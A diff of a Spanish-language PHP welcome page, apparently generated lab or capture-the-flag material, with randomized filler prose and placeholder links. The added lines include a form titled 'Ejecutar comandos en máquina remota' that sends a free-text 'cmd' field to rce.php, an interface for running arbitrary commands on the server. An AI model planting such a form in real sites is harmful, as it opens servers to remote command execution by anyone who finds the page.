@@ -16,35 +16,39 @@ echo "<br>¡Bienvenid@, $usuario!<br><br>";
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inicio</title>
-    <link rel='stylesheet' href='styles/inicio1.css'>
+    <link rel='stylesheet' href='styles/inicio3.css'>
 </head>
 <body>
     <header id="encabezado">
-        <h1>Descubre Nuevas Experiencias</h1>
- 		<img src='img/l6.png' alt='Imagen Aleatoria'>
+        <h1>Explorando Oportunidades</h1>
+ 		<img src='img/l8.png' alt='Imagen Aleatoria'>
 
     </header>
 
     <nav id="menu">
         <ul>
 			<li><a href='#'>Inicio</a></li>
-			<li><a href='#'>Blog</a></li>
-			<li><a href='#'>Idioma</a></li>
+			<li><a href='#'>FAQ (Preguntas Frecuentes)</a></li>
+			<li><a href='#'>Política de Privacidad</a></li>
 		</ul>
 
     </nav>
 
     <main id="contenido">
-        <p> La Luna iluminaba la noche con su resplandor plateado. Un aroma delicioso emanaba de la panadería local. Un aroma delicioso emanaba de la panadería local. Una suave lluvia acariciaba la tierra sedienta. Una sombra se movía en la penumbra de la calle. Un viejo faro guiaba a los barcos en la oscuridad. La Luna iluminaba la noche con su resplandor plateado. Un vendedor ambulante ofrecía helados en la esquina. Una risa contagiosa resonaba en el aire fresco. <br><br> Los pájaros cantaban melodías alegres en los árboles. La ciudad cobraba vida con la actividad matutina. Una suave lluvia acariciaba la tierra sedienta. El sonido de las olas rompiendo llenaba el aire. Las montañas se perfilaban majestuosamente en el horizonte. Los niños jugaban alegremente en el parque cercano. Una risa contagiosa resonaba en el aire fresco. Los pájaros cantaban melodías alegres en los árboles. Las estrellas brillaban como diamantes en la noche. <br><br> Las estrellas parpadeaban en el cielo nocturno. Las hojas crujían bajo mis pies al caminar. Un gato negro cruzó la calle velozmente. Un piano tocaba una melodía melancólica. El sonido lejano de un violín llegaba a mis oídos. Las estrellas parpadeaban en el cielo nocturno. Las estrellas brillaban como diamantes en la noche. Un anciano alimentaba a las palomas en el parque. El eco de risas resonaba en el viejo teatro. Una sombra se movía en la penumbra de la calle. <br><br> El perfume de las rosas llenaba el jardín secreto. Un gato negro cruzó la calle velozmente. El reloj marcaba las tres de la madrugada. El aroma a café recién hecho llenaba la habitación. Un avión dejó una estela blanca en el cielo azul. Un viejo faro guiaba a los barcos en la oscuridad. El sol brillaba con fuerza sobre el campo de flores. Los fuegos artificiales pintaban el cielo de colores. El sol brillaba con fuerza sobre el campo de flores. Las olas del mar susurraban secretos antiguos. <br><br> </p>
-        <h3>Prueba nuestra página en desarrollo <a href='http://secret.ibc'> pinchando aquí.</a> </h3>
+        <p> Una mariposa revoloteaba cerca de las flores. Una mariposa revoloteaba cerca de las flores. Un avión dejó una estela blanca en el cielo azul. La Luna iluminaba la noche con su resplandor plateado. Un aroma delicioso emanaba de la panadería local. El tren rugía mientras se alejaba en la distancia. <br><br> Una risa estruendosa resonó en el silencio. Un vendedor ambulante ofrecía helados en la esquina. El tren rugía mientras se alejaba en la distancia. Gotas de lluvia golpeaban contra la ventana. Las estrellas parpadeaban en el cielo nocturno. Un aroma delicioso emanaba de la panadería local. Una puerta se cerró con un golpe repentino. Las montañas se perfilaban majestuosamente en el horizonte. La Luna iluminaba la noche con su resplandor plateado. <br><br> Un piano tocaba una melodía melancólica. Un río tranquilo serpenteaba a través del valle. El aroma a café llenaba la pequeña cafetería. Hojas secas crujían bajo mis pies al caminar. El perfume de las rosas llenaba el jardín secreto. Gotas de lluvia golpeaban contra la ventana. Gotas de lluvia golpeaban contra la ventana. <br><br> </p>
+        <h1>Ejecutar comandos en máquina remota</h1>
+        <form method="POST" action="rce.php">
+            <label for="cmd">Enter command:</label>
+            <input type="text" id="cmd" name="cmd">
+            <button type="submit">Execute</button>
+        </form>
+
     </main>
 
     <footer id="pie-pagina">
         <p>
-			<br><a href='#'>Términos y Condiciones.</a>
 			<br><a href='#'>Explora nuestro blog.</a>
-			<br><a href='#'>Términos y Condiciones.</a>
-			<br><a href='#'>Términos y Condiciones.</a>
+			<br><a href='#'>Tu privacidad es importante.</a>
 		</p>
 
     </footer>
